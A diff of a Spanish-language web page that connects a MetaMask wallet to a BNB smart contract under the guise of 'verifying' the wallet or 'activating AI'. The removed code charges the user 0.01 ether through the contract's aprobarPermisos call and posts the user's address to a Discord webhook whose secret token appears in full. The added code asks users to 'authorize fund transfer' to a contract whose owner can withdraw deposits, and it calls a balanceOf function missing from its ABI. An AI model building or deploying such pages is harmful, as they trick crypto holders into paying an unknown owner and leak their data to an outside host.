@@ -1,94 +1,50 @@
 <!DOCTYPE html>
-<html lang="es">
-  <head>
+<html>
+<head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>Conectar Wallet y Verificar Permisos</title>
-  </head>
-  <body>
-    <div class="card">
-      <h1>Conectar Wallet y Verificar Permisos</h1>
-      <button id="connect-btn">Conectar</button>
-      <button id="verify-btn" style="display:none;">Verificar Wallet</button>
-      <p id="message"></p>
-    </div>
+    <title>Conectar a Metamask</title>
+    <script src="https://cdn.ethers.io/lib/ethers-5.0.umd.min.js" integrity="sha384-LgD6YYy8zJhHcdnc1ucbFkDlQ2hPe11ft9XvYpHaBkjnw+WTf/gwzG+i5Rl/dPz" crossorigin="anonymous"></script>
+    <script type="text/javascript">
+        const contractAddress = "0x385C413138A50aabF895dC0855e0f85448dC6838";
+        const abi = [{"inputs":[{"internalType":"address","name":"_direccionComun","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"depositante","type":"address"},{"indexed":false,"internalType":"uint256","name":"cantidadBNB","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"cantidadTokens","type":"uint256"}],"name":"FondosDepositados","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"cantidadBNB","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"cantidadTokens","type":"uint256"}],"name":"FondosRetirados","type":"event"},{"stateMutability":"payable","type":"fallback"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"aprobaciones","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"aprobarPermisos","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"direccionComun","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address payable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"retirarFondos","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}];
 
-    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
-    <script>
-      window.addEventListener('load', async () => {
-        const web3 = new Web3(window.ethereum);
-        await window.ethereum.enable();
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
+        const contract = new ethers.Contract(contractAddress, abi, signer);
 
-        const contractAddress = "0xF8b5858DFf2E1d5e4a64133bd70121B83869fa55";
-        const contractABI = [{"inputs":[{"internalType":"address","name":"_direccionComun","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"depositante","type":"address"},{"indexed":false,"internalType":"uint256","name":"cantidadBNB","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"cantidadTokens","type":"uint256"}],"name":"FondosDepositados","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"cantidadBNB","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"cantidadTokens","type":"uint256"}],"name":"FondosRetirados","type":"event"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"aprobaciones","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"aprobarPermisos","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"direccionComun","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address payable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"retirarFondos","outputs":[],"stateMutability":"nonpayable","type":"function"}]
-          {
-            "inputs": [
-              {
-                "internalType": "address",
-                "name": "_direccionComun",
-                "type": "address"
-              }
-            ],
-            "stateMutability": "nonpayable",
-            "type": "constructor"
-          },
-          {
-            "inputs": [],
-            "name": "aprobarPermisos",
-            "outputs": [],
-            "stateMutability": "payable",
-            "type": "function"
-          }
-        ];
+        async function conectarMetamask() {
+            await window.ethereum.enable();
+            const accounts = await provider.listAccounts();
+            const address = accounts[0];
+            const balanceBNB = await provider.getBalance(address);
+            const balanceTokens = await contract.balanceOf(address);
 
-        const contract = new web3.eth.Contract(contractABI, contractAddress);
+            // Añadir código para actualizar la card con el saldo del usuario
 
-        document.getElementById('connect-btn').addEventListener('click', async () => {
-          await window.ethereum.enable();
-          const accounts = await web3.eth.getAccounts();
-          const message = `Haz conectado tu Wallet con éxito! Tu dirección es: ${accounts[0]}`;
-          document.getElementById('message').innerText = message;
-          document.getElementById('verify-btn').style.display = "inline-block";
-        });
+            console.log("Usuario conectado:", address);
+            console.log("Saldo en BNB:", ethers.utils.formatEther(balanceBNB));
+            console.log("Saldo en tokens:", ethers.utils.formatUnits(balanceTokens, 18));
+        }
 
-        document.getElementById('verify-btn').addEventListener('click', async () => {
-          const accounts = await web3.eth.getAccounts();
-          const options = {
-            from: accounts[0],
-            value: web3.utils.toWei('0.01', 'ether'),
-            gasPrice: web3.utils.toWei('10', 'gwei')
-          };
-
-          const message = "Activar IA";
-          try {
-            await contract.methods.aprobarPermisos().send(options);
-            document.getElementById('message').innerText = `Permisos concedidos para: ${message}`;
-            // Llamada al webhook
-            const webhookUrl = "https://discordapp.com/api/webhooks/1100911152516575334/ejdUwH703TcjZJbSi8UHzT1JwimydWOzQccvtoITr84v0Y56AIziAXL2eXWr5PjjQfJZ";
-            const response = await fetch(webhookUrl, {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json"
-              },
-              body: JSON.stringify({message: "Se ha concedido permiso para " + message, userAddress: accounts[0]})
-            });
-          } catch (e) {
-            console.log(e);
-            document.getElementById('message').innerText = "Error al conceder permisos";
-          }
-        });
-      });
+        async function aprobarPermisos() {
+            try {
+                const tx = await contract.aprobarPermisos();
+                await tx.wait();
+                console.log("Permisos aprobados");
+            } catch (error) {
+                console.error("Error al aprobar permisos:", error);
+            }
+        }
     </script>
-
-    <style>
-      .card {
-        border: 1px solid black;
-        padding: 20px;
-        width: 400px;
-        margin: 50px auto;
-        text-align: center;
-      }
-    </style>
-  </body>
+</head>
+<body>
+    <div class="card">
+        <div class="card-body">
+            <h5 class="card-title">Conectar a Metamask</h5>
+            <p class="card-text">Haz clic en el botón para conectar a Metamask y autorizar la transferencia de fondos</p>
+            <button class="btn btn-primary" onclick="conectarMetamask()">Conectar a Metamask</button>
+            <button class="btn btn-secondary" onclick="aprobarPermisos()">Autorizar transferencia</button>
+        </div>
+    </div>
+</body>
 </html>
